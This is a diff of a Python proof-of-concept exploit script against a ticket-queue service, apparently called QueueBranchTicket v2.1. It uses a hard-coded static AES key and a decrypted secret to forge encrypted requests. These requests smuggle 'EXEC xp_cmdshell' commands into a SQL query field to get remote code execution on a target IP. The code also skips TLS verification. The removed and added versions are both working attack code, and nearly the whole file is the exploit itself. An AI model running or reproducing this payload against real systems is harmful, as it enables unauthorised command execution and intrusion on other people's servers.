@@ -1,140 +1,106 @@
 #!/usr/bin/env python3
-"""
-QueueBranchTicket v2.1 — RCE PoC
-Reports: VULNERABLE (with shell) or NOT EXPLOITABLE (with reason)
-"""
-import socket, ssl, sys, hashlib, uuid, base64
+import socket
+import ssl
+import sys
+import hashlib
+import base64
+import json
+import uuid
 from datetime import datetime
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
 KEY_STATIC = "a3(D3$@fK3"
 ENCRYPTED_SECRET_KEY = "USJJ2ecM0/T8zLBzfsOec7KB1jIBUXcypIfvedawppk="
-IV_ZERO = b"\x00" * 16
+IV_16_ZERO = b"\x00" * 16
 
+def get_key(password):
+    pwd = password.ljust(24, " ") if len(password.encode("utf-8")) < 24 else password[:24]
+    return pwd.encode("utf-8")
 
-def get_key(pw):
-    if len(pw.encode("utf-8")) < 24:
-        return pw.ljust(24).encode("utf-8")
-    return pw[:24].encode("utf-8")
+def aes_encrypt(plaintext, password):
+    key = get_key(password if password else KEY_STATIC)
+    data = plaintext.encode("ascii")
+    pad_len = 16 - (len(data) % 16)
+    data_padded = data + bytes([pad_len] * pad_len)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_16_ZERO), backend=default_backend())
+    encryptor = cipher.encryptor()
+    return base64.b64encode(encryptor.update(data_padded) + encryptor.finalize()).decode("ascii")
 
+def aes_decrypt(cipher_b64, password):
+    key = get_key(password if password else KEY_STATIC)
+    ct = base64.b64decode(cipher_b64.replace(" ", "+"))
+    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_16_ZERO), backend=default_backend())
+    decryptor = cipher.decryptor()
+    padded = decryptor.update(ct) + decryptor.finalize()
+    return padded[:-padded[-1]].decode("utf-8")
 
-def aes_crypt(data, pw, encrypt=True):
-    key = get_key(pw if pw else KEY_STATIC)
-    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_ZERO), backend=default_backend())
-    op = cipher.encryptor() if encrypt else cipher.decryptor()
-    if encrypt:
-        pad = 16 - (len(data) % 16)
-        data = data + bytes([pad] * pad)
-        return op.update(data) + op.finalize()
-    else:
-        pt = op.update(data) + op.finalize()
-        return pt[:-pt[-1]]
+def process_encrypt_value(plaintext, guid=None):
+    if guid is None:
+        guid = str(uuid.uuid4()).replace("-", "")[:16]
+    first_part = aes_encrypt(plaintext, guid + KEY_STATIC)
+    secret_key = first_part[:12]
+    second_part = aes_encrypt(guid, secret_key + KEY_STATIC)
+    return first_part + "|" + second_part
 
-
-def decrypt_secret():
-    return aes_crypt(base64.b64decode(ENCRYPTED_SECRET_KEY.replace(" ", "+")), KEY_STATIC, False)
-
-
-def double_encrypt(plaintext, guid=None):
-    guid = guid or str(uuid.uuid4()).replace("-", "")[:16]
-    first = base64.b64encode(aes_crypt(plaintext.encode("ascii"), guid + KEY_STATIC)).decode()
-    sk = first[:12]
-    second = base64.b64encode(aes_crypt(guid.encode(), sk + KEY_STATIC)).decode()
-    return first + "|" + second
-
-
-def sha256_hex(text):
-    return hashlib.sha256(text.encode("utf-8")).hexdigest().upper()
-
-
-def connect(ip, port, tls=True):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(10)
-    s.connect((ip, port))
-    if tls:
+def connect(target, port, use_tls=True):
+    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    raw_sock.settimeout(10)
+    raw_sock.connect((target, port))
+    if use_tls:
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        s = ctx.wrap_socket(s, server_hostname=ip)
-    return s
+        return ctx.wrap_socket(raw_sock, server_hostname=target)
+    return raw_sock
 
-
-def send_recv(s, payload):
-    s.sendall(payload.encode("utf-8"))
+def send_recv(sock, payload):
+    sock.sendall(payload.encode("utf-8"))
     chunks = []
-    try:
-        while True:
-            chunks.append(s.recv(65536))
-    except socket.timeout:
-        pass
+    while True:
+        try:
+            data = sock.recv(65536)
+            if not data:
+                break
+            chunks.append(data)
+        except socket.timeout:
+            break
     return b"".join(chunks).decode("utf-8", errors="replace")
-
-
-def try_exploit(ip, port, tls, cmd):
-    sk = decrypt_secret()
-    uid = str(uuid.uuid4()).replace("-", "")[:16]
-    today = datetime.utcnow().strftime("%Y-%m-%d")
-
-    sql = f"EXEC xp_cmdshell CONCAT(CHAR(39), {cmd}, CHAR(39))"
-
-    # --- Attempt 1: Pass auth (date|uid) ---
-    auth_payload = double_encrypt(
-        f"QUERY-DATA==SQLSERVER={sql}|{today}|{uid}=UID{uid[:8]}"
-    )
-    try:
-        s = connect(ip, port, tls)
-        resp = send_recv(s, auth_payload)
-        s.close()
-        if "cmd" in resp.lower() or "whoami" in resp.lower():
-            return True, "RCE via auth hash", resp
-    except Exception as e:
-        pass
-
-    # --- Attempt 2: Pass integrity (SHA256) ---
-    file_hash = sha256_hex(sql + sk + "SqlFileDynamic.sql")
-    integrity_payload = double_encrypt(
-        f"QUERY-DATA==SQLSERVER={sql}={file_hash}=UID{uid[:8]}"
-    )
-    try:
-        s = connect(ip, port, tls)
-        resp = send_recv(s, integrity_payload)
-        s.close()
-        if "cmd" in resp.lower() or "whoami" in resp.lower():
-            return True, "RCE via SHA256 hash", resp
-    except Exception as e:
-        pass
-
-    return False, None, None
-
 
 def main():
     if len(sys.argv) < 2:
         print("Usage: python v21_poc.py <target_ip> [port] [--no-tls]")
-        sys.exit(1)
+        return
 
-    ip = sys.argv[1]
-    port = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else 5758
-    tls = "--no-tls" not in sys.argv
+    target = sys.argv[1]
+    port = int(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else 5758
+    use_tls = "--no-tls" not in sys.argv
 
-    print(f"Target: {ip}:{port} TLS={tls}")
-    print("Testing v2.1 RCE...\n")
+    today = datetime.now().strftime("%Y-%m-%d")
+    uid = str(uuid.uuid4()).replace("-", "")[:16]
+    sql = "EXEC xp_cmdshell CONCAT(CHAR(39), 'whoami', CHAR(39))"
 
-    ok, method, resp = try_exploit(ip, port, tls, "whoami")
-    if ok:
-        print(f"VULNERABLE — {method}")
-        print(f"Response:\n{resp}")
-    else:
-        # Check connectivity
+    payload = process_encrypt_value(f"QUERY-DATA=SQLSERVER={sql}={today}|{uid}=exploit_{uid[:8]}")
+
+    try:
+        sock = connect(target, port, use_tls)
+        response = send_recv(sock, payload)
+        sock.close()
+
+        print(f"Target: {target}:{port}")
+        print(f"Response ({len(response)} bytes):")
         try:
-            s = connect(ip, port, tls)
-            s.close()
-            print("NOT EXPLOITABLE — Server reachable but RCE blocked by SecureHash conflict")
-            print("  AuthorizeRequest requires date|uid format, but integrity check requires SHA256 hex")
-            print("  These are mutually exclusive → impossible to satisfy both")
-        except Exception as e:
-            print(f"NOT EXPLOITABLE — Cannot connect: {e}")
+            print(json.dumps(json.loads(response), indent=2))
+        except:
+            print(response)
+        print()
 
+        if "OK" in response or "SUCCESS" in response.upper():
+            print(">>> VULNERABLE <<<")
+        else:
+            print(">>> NOT VULNERABLE <<<")
+    except Exception as e:
+        print(f"Connection failed: {e}")
 
 if __name__ == "__main__":
     main()
